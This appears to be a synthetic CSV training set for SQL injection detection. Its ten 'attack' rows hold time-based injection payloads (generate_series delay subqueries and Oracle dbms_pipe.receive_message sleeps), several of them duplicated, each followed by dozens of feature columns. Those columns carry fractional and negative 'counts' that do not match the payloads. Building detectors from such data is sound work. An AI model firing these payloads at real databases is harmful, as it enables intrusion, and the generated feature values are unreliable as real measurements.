id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000272,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.5212114181438556,128.5137176513672,46.459930419921875,17.781112670898438,49.48908233642578,0.0057472470216453075,49.624080657958984,23.66293716430664,1.1905845403671265,0.2647576630115509,0.16530470550060272,0.3634203374385834,0.13737784326076508,3.5634078979492188,1.1214357614517212,0.9919737577438354,1.2630817890167236,0.03777482360601425,0.06408131867647171,0.00608070520684123,3.7592720985412598,4.649796962738037,1.790248155593872,0.01861187443137169,1.4799697399139404,0.10607674717903137,-0.009924612008035183,0.11426560580730438,0.5945048928260803,0.5249618291854858,0.017515266314148903,-0.02012774348258972,0.09878349304199219,0.23147791624069214,0.5709282159805298,1.5944759845733643,2.7624385356903076,0.6957358717918396,0.5708176493644714,-0.16840094327926636,0.3756333291530609,0.44401445984840393,-0.030610740184783936,-0.12494383007287979,-0.03232702985405922,-0.04546775668859482,-0.17564824223518372,0.06578733026981354,0.14977766573429108,0.12871843576431274,-0.07709440588951111,0.057223834097385406,-0.0810953676700592,0.058953411877155304,-0.020977621898055077,-0.04847048223018646,0.009253112599253654,0.18766459822654724,0.03653596341609955,0.1432352066040039,-0.02658134698867798,0.07205580174922943,0.060558218508958817,1.8164712190628052,0.21357987821102142,0.02163032814860344,0.028193987905979156,-0.08399426192045212,0.12432713806629181,0.05666578933596611,0.012495648115873337,-0.26329922676086426,0.038101136684417725,0.02345787174999714,0.14913830161094666,0.08368328213691711,1.0626649856567383,0.5159999132156372,-0.14493581652641296,0.012648806907236576,-0.03530871123075485,4.39810848236084,0.9828211665153503,0.23190352320671082,-0.14250394701957703,0.08211436867713928,0.007004428654909134,0.05689090117812157,0.004994746297597885
GAN_000273,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.492530139519222,139.78054809570312,44.74482345581055,16.97649574279785,46.28099060058594,0.012803775258362293,51.42464065551758,22.52970314025879,1.0374279022216797,0.3063444197177887,0.16093653440475464,0.3704807460308075,0.13919061422348022,3.6903958320617676,1.0253260135650635,0.9177400469779968,1.0650094747543335,0.01985231414437294,0.08184153586626053,0.023595254868268967,4.149402141571045,4.000298500061035,1.6138900518417358,0.02188023552298546,1.53347647190094,0.12803612649440765,0.029254639521241188,0.22202305495738983,0.853397011756897,0.4967052936553955,0.03234151378273964,-0.11140752583742142,0.043357428163290024,0.07846660912036896,0.4481799304485321,1.5554358959197998,3.091585636138916,0.7370086908340454,0.5839295983314514,-0.020996205508708954,0.3730776906013489,0.4725066125392914,0.15031704306602478,-0.006838373839855194,0.024176940321922302,-0.07001393288373947,-0.17326150834560394,0.1378442347049713,0.10584470629692078,0.15398168563842773,0.07558281719684601,0.10077421367168427,-0.12152443826198578,0.04726283252239227,-0.023682378232479095,-0.12791377305984497,-0.002987468149513006,0.19522909820079803,-0.011740125715732574,0.06971578299999237,-0.04122079908847809,-0.013850461691617966,-0.118818499147892,1.793307900428772,0.24355530738830566,0.019775789231061935,-0.005280419252812862,0.11850925534963608,0.11148277670145035,-0.037493668496608734,0.09148719906806946,-0.15248152613639832,0.003110170364379883,0.02011972665786743,0.18531551957130432,0.04608502984046936,0.8656222224235535,0.3910476267337799,-0.023041561245918274,0.0928971990942955,0.029074925929307938,4.820287227630615,0.9377052783966064,0.09131425619125366,-0.1309814751148224,0.20116272568702698,0.02506556361913681,0.04357491061091423,-0.0052548800595104694
GAN_000274,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.6754041890479643,127.88162994384766,34.7828254699707,18.227249145507812,48.80900955200195,-0.0012948951916769147,59.15101623535156,24.08580780029297,0.9979339838027954,0.277474582195282,0.17885005474090576,0.36122849583625793,0.1407143920660019,3.6529006958007812,0.9296970367431641,0.7729514241218567,0.9966301321983337,0.06209845840930939,0.06294724345207214,0.018611563369631767,3.9431722164154053,4.637840747833252,1.4962362051010132,0.02537582255899906,1.4883447885513306,0.3008594512939453,-0.01930239237844944,0.03514629974961281,0.9022177457809448,0.5556263327598572,0.03822918236255646,-0.3269790709018707,0.0929221510887146,0.05069151893258095,0.442028671503067,1.637566328048706,3.4688408374786377,0.6846905946731567,0.5650424361228943,-0.14891278743743896,0.44240182638168335,0.4125373065471649,0.062339961528778076,-0.08786917477846146,0.17925967276096344,-0.15154653787612915,-0.019016511738300323,0.08557531237602234,0.1891816258430481,0.19068588316440582,0.020142242312431335,0.010112956166267395,-0.0010630488395690918,-0.024677269160747528,-0.0903506800532341,-0.04290910065174103,0.0004205111472401768,0.2414676696062088,-0.09865804016590118,0.25005337595939636,-0.03932163119316101,-0.038258083164691925,0.00460372120141983,1.8562523126602173,0.21017897129058838,0.044498465955257416,-0.007246757857501507,0.18772858381271362,0.06998584419488907,0.021807797253131866,-0.19445019960403442,-0.15368862450122833,0.10610704123973846,0.008165481500327587,0.1714918464422226,0.04429309815168381,0.98021000623703,0.4276386797428131,-0.11710744351148605,0.14497900009155273,0.07644645124673843,4.835951805114746,1.0306991338729858,0.21191135048866272,-0.1267593950033188,0.06586503982543945,0.08037999272346497,0.11159899830818176,0.010617339052259922
GAN_000275,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.6431900994323914,119.30998992919922,42.77949142456055,15.745841026306152,51.499267578125,-0.004953113384544849,52.952579498291016,26.67038917541504,1.1735724210739136,0.24378836154937744,0.16057801246643066,0.36822938919067383,0.14038912951946259,3.544095277786255,1.1161233186721802,1.3701163530349731,1.332882285118103,0.04457700997591019,0.047925759106874466,0.018593234941363335,3.787318468093872,4.313780307769775,1.8758512735366821,0.02617548033595085,1.4844448566436768,0.08310279250144958,-0.009879308752715588,-0.029913676902651787,0.15786798298358917,0.5845528244972229,0.017749924212694168,0.0729232057929039,0.0289163701236248,0.3212192952632904,0.6323338150978088,1.5829522609710693,1.5845071077346802,0.3728608787059784,0.5405893921852112,-0.11674350500106812,0.4529017508029938,0.5318593382835388,-0.14533114433288574,-0.1662895381450653,0.15689867734909058,-0.024035923182964325,-0.3245493769645691,0.07292094081640244,0.08902439475059509,0.15226808190345764,-0.14576980471611023,0.14213943481445312,-0.11361607909202576,0.2036779224872589,-0.05450146645307541,-0.23516370356082916,0.002983223646879196,0.19893252849578857,0.23792235553264618,0.03618953004479408,0.043941035866737366,0.25378066301345825,-0.13591226935386658,1.660069465637207,0.22117474675178528,0.024319801479578018,0.021700728684663773,0.2302548885345459,0.16818244755268097,0.06924159079790115,-0.0983736589550972,-0.29054102301597595,-0.0011431947350502014,0.03276699036359787,0.27970731258392334,0.1368962824344635,1.1296790838241577,0.3933979868888855,-0.2115788459777832,-0.11097373068332672,-0.036590129137039185,4.0313801765441895,1.0574747323989868,0.2646145820617676,-0.43238210678100586,-0.03140213340520859,-0.027413174510002136,0.42365026473999023,-0.003547071944922209
GAN_000276,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.9874924257868853,127.66932678222656,46.19453811645508,17.699689865112305,31.669544219970703,0.007281294092535973,54.37562561035156,26.879127502441406,1.5404019355773926,0.22299076616764069,0.17674995958805084,0.38031286001205444,0.1397683024406433,3.442730665206909,0.8543940186500549,1.409350037574768,1.4340760707855225,0.045469097793102264,0.04948478564620018,0.006860744673758745,4.621781826019287,3.934030771255493,1.6501836776733398,0.01773965172469616,1.4965327978134155,0.24984942376613617,0.011158854700624943,0.19156062602996826,0.36729440093040466,0.5121671557426453,0.01562521979212761,0.018521763384342194,0.06978960335254669,0.43818438053131104,0.5937840342521667,1.7985025644302368,1.5798951387405396,0.3402385115623474,0.562197744846344,-0.18071168661117554,0.535764217376709,0.43873029947280884,-0.13361558318138123,-0.2576141357421875,0.14126168191432953,0.036737821996212006,-0.36048465967178345,0.17013494670391083,0.1455073356628418,0.15160243213176727,-0.11122632026672363,0.09690926969051361,-0.5048809051513672,0.2884235382080078,0.07683742791414261,-0.18996606767177582,0.009718341752886772,0.33405667543411255,0.1551186889410019,0.07917141914367676,0.028299391269683838,0.3918670415878296,-0.3111856281757355,2.168104648590088,0.5748494267463684,0.017403079196810722,0.05484357848763466,0.04093814641237259,0.2011842578649521,-0.1719578504562378,0.08334959298372269,-0.5060964226722717,-0.1025673896074295,-0.005772792734205723,0.5338171720504761,0.15235693752765656,0.9732281565666199,0.36711734533309937,-0.14868766069412231,-0.0899447351694107,-0.12309892475605011,2.8436808586120605,1.0199291706085205,0.4232824742794037,-0.39918506145477295,0.13634434342384338,-0.14989645779132843,0.04950516298413277,-0.0034930328838527203
GAN_000277,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.91205327583962,122.55350494384766,32.85838317871094,18.060396194458008,41.336116790771484,-0.027129031717777252,59.474021911621094,26.125019073486328,1.0476906299591064,0.23258517682552338,0.17684368789196014,0.36974480748176575,0.14313629269599915,3.4985058307647705,1.0669535398483276,1.2308546304702759,1.2456738948822021,0.09265211969614029,0.057403694838285446,0.012677082791924477,3.3263344764709473,4.737875938415527,1.3635503053665161,0.01516698021441698,1.5125868320465088,0.26286545395851135,-0.03371475264430046,0.06358139216899872,0.47992271184921265,0.5920010209083557,0.024509049952030182,-0.08478066325187683,0.04479466378688812,0.23954376578330994,0.5283491611480713,1.8265175819396973,2.8767130374908447,0.503970742225647,0.49564874172210693,-0.19988085329532623,0.38789013028144836,0.48562222719192505,-0.14882686734199524,-0.19186943769454956,0.2834612727165222,0.019069641828536987,-0.19929733872413635,0.09293070435523987,0.1399276703596115,0.16980329155921936,-0.11543680727481842,0.059977054595947266,-0.14538930356502533,0.23910591006278992,-0.06502801179885864,-0.08959130942821503,-0.0006763693527318537,0.45573699474334717,-0.03654971718788147,0.1146637350320816,0.19832465052604675,0.081300750374794,-0.23589733242988586,2.546067953109741,0.30384039878845215,0.005788749549537897,0.0291989054530859,0.11827412992715836,0.12183889001607895,0.047539494931697845,-0.0005026534199714661,-0.23590844869613647,0.05796688795089722,0.04413854330778122,0.2980819344520569,0.14617414772510529,1.187347412109375,0.3915286958217621,-0.27566415071487427,0.019131960347294807,0.08072105050086975,4.949403762817383,0.999973475933075,0.33110159635543823,-0.2184167504310608,-0.08748786896467209,-0.054922766983509064,0.17141932249069214,-0.012594994157552719
GAN_000278,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,3.553162191064429,121.51837158203125,37.2215576171875,15.278914451599121,41.296875,-0.017525436356663704,60.41102981567383,26.30577850341797,0.9865773916244507,0.27407610416412354,0.16976243257522583,0.36449116468429565,0.14151759445667267,3.6361632347106934,1.1272692680358887,0.8254901170730591,0.9236020445823669,0.02737424150109291,0.03999203443527222,0.023630419746041298,4.433687210083008,3.802354097366333,1.3058546781539917,0.021805131807923317,1.47800612449646,0.1920599788427353,-0.007155715022236109,0.0801505446434021,0.20450086891651154,0.5513555407524109,0.030624154955148697,-0.1663782000541687,0.03604430705308914,0.11827138066291809,0.5128739476203918,1.60234797000885,2.8175013065338135,0.583989679813385,0.5868417620658875,-0.00619550421833992,0.48002851009368896,0.48719173669815063,0.13191580772399902,-0.06293503195047379,0.24316705763339996,0.0038722380995750427,-0.08414468169212341,0.10931982100009918,0.10327538847923279,0.17728422582149506,-0.01331453025341034,0.08994345366954803,-0.05658000707626343,-0.002794504165649414,-0.0023430325090885162,-0.31264352798461914,-0.014056099578738213,0.1070268452167511,0.010113909840583801,0.28741905093193054,-0.07536760717630386,0.10295812785625458,-0.1333453357219696,2.1560721397399902,0.32911714911460876,0.03813019022345543,-0.0007543109240941703,0.33356526494026184,0.046198561787605286,-0.22344562411308289,-0.019179977476596832,-0.20471884310245514,0.1611013263463974,0.026921069249510765,0.11440876126289368,-0.0076660774648189545,0.9007141590118408,0.29320621490478516,-0.28276345133781433,0.05717362463474274,0.026272878050804138,4.401068210601807,1.0270802974700928,0.156778484582901,-0.25894612073898315,0.12177832424640656,0.05366632714867592,0.18432797491550446,0.00019385098130442202
GAN_000279,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.714146394212262,127.25047302246094,32.22658157348633,16.828229904174805,38.577659606933594,-0.04109751060605049,59.44975280761719,25.292020797729492,0.9411036968231201,0.2693559229373932,0.15890537202358246,0.3651503026485443,0.14263920485973358,3.565035820007324,0.897661030292511,1.0330137014389038,1.1104854345321655,0.045638155192136765,0.058991122990846634,-0.008293691091239452,4.532589912414551,4.520031452178955,1.0674711465835571,0.022445116192102432,1.5124871730804443,0.3233892023563385,0.0015669571002945304,0.06417039036750793,0.5693763494491577,0.5457176566123962,0.022989222779870033,-0.13280263543128967,0.03716134652495384,0.028693659231066704,0.4982418119907379,1.7534931898117065,3.592802047729492,0.7340325713157654,0.6128426790237427,-0.10899345576763153,0.4372800290584564,0.46780022978782654,0.08350025862455368,-0.12029130011796951,0.35053932666778564,-0.049537934362888336,-0.10976123809814453,0.08743783086538315,0.0944141298532486,0.19151513278484344,-0.0438661128282547,0.08577901870012283,-0.10280202329158783,0.18344563245773315,-0.04731477424502373,-0.22745586931705475,-0.002059066202491522,0.23048800230026245,-0.07997509837150574,0.3284096419811249,0.04621376097202301,-0.003975570201873779,-0.19626209139823914,2.0520167350769043,0.4568749666213989,0.027895445004105568,0.01829955354332924,0.24716955423355103,-0.03978914022445679,-0.11734982579946518,0.0017394497990608215,-0.1494665890932083,0.12534424662590027,0.018444787710905075,0.23931370675563812,0.08669242262840271,0.9656041264533997,0.34291398525238037,-0.15830114483833313,0.1252325177192688,0.01976754516363144,5.309109687805176,0.9920946955680847,0.0827493667602539,-0.08858032524585724,0.12567190825939178,0.05013991519808769,0.09892742335796356,0.005171193275600672
GAN_000280,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,3.7392158723194875,117.29849243164062,41.416358947753906,14.801372528076172,41.94106674194336,0.0011341421632096171,53.14149856567383,26.877105712890625,1.1993541717529297,0.2330026477575302,0.17224185168743134,0.36042651534080505,0.13757610321044922,3.5351226329803467,0.9996526837348938,0.9793350100517273,1.1399377584457397,0.0493176206946373,0.04216868430376053,-0.00176853162702173,4.966994762420654,3.7192232608795166,1.4812871217727661,0.023265616968274117,1.4668139219284058,0.24326594173908234,-0.009885626845061779,-0.02578563801944256,-0.009254851378500462,0.6006832122802734,0.02270091138780117,-0.02240084856748581,0.01837317645549774,0.22336554527282715,0.5577669739723206,1.657439112663269,2.460214138031006,0.34479308128356934,0.5154559016227722,-0.056433625519275665,0.5432400703430176,0.5132395029067993,0.034404341131448746,-0.311647891998291,0.22805391252040863,-0.05408395081758499,-0.21170860528945923,0.002558492124080658,0.11701567471027374,0.2048286646604538,-0.19121983647346497,0.09379706531763077,-0.03028445690870285,0.1747751533985138,0.08448043465614319,-0.3223702907562256,-0.007693559397011995,0.12315089255571365,0.2643740773200989,0.26211875677108765,-0.07516247034072876,0.19548442959785461,0.03893453627824783,1.9864946603775024,0.19248104095458984,0.05287459120154381,0.02170112170279026,0.16389700770378113,0.09480150789022446,-0.11312965303659439,-0.11499328166246414,-0.21365422010421753,0.11300143599510193,0.019463224336504936,0.1852073222398758,0.0745263397693634,1.0721944570541382,0.426358699798584,-0.36182111501693726,-0.04774351418018341,0.12862038612365723,4.515552520751953,1.0814852714538574,0.304850697517395,-0.12027691304683685,0.010882340371608734,-0.01009795069694519,0.38152098655700684,0.010344186797738075
GAN_000281,attack,boolean,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000035,3.7183937676861087,132.15879821777344,34.7522087097168,17.7982234954834,47.19536590576172,-0.014143607579171658,57.95003890991211,23.41966438293457,1.0943652391433716,0.27462393045425415,0.1697668880224228,0.37990057468414307,0.140679270029068,3.613736391067505,0.8539412617683411,1.2541857957839966,1.1537364721298218,0.07191896438598633,0.09949414432048798,0.01442492101341486,4.380581855773926,4.7540974617004395,1.3818131685256958,0.02188485488295555,1.534777045249939,0.37372681498527527,-0.011125116609036922,0.03899746015667915,0.7450116276741028,0.5532516837120056,0.03664486110210419,-0.12563090026378632,0.018117621541023254,0.013307284563779831,0.4946475923061371,1.7056910991668701,2.8986740112304688,0.6456020474433899,0.5798228979110718,-0.11844776570796967,0.4208031892776489,0.4364074766635895,-0.12873707711696625,-0.10060881823301315,0.12132158875465393,-0.11481545120477676,-0.24414661526679993,0.14640511572360992,0.16013143956661224,0.20254772901535034,0.004181124269962311,0.07311080396175385,-0.21059849858283997,0.23684903979301453,-0.0019811727106571198,-0.11823107302188873,-0.007094781380146742,0.26963135600090027,0.035697758197784424,0.021854165941476822,0.12266227602958679,0.11126808822154999,-0.24610084295272827,1.9775062799453735,0.2837945222854614,0.019852006807923317,-0.0014845450641587377,0.3416338562965393,0.11881943047046661,0.0925050601363182,-0.049401141703128815,-0.1590837687253952,0.06972387433052063,0.018764818087220192,0.39960044622421265,0.029624851420521736,0.961566686630249,0.39007487893104553,-0.1286446750164032,0.010010645724833012,0.04991874843835831,4.09566068649292,1.0113390684127808,0.1963939070701599,-0.18517422676086426,0.03784879297018051,0.02811761572957039,0.21201063692569733,-0.0017744234064593911
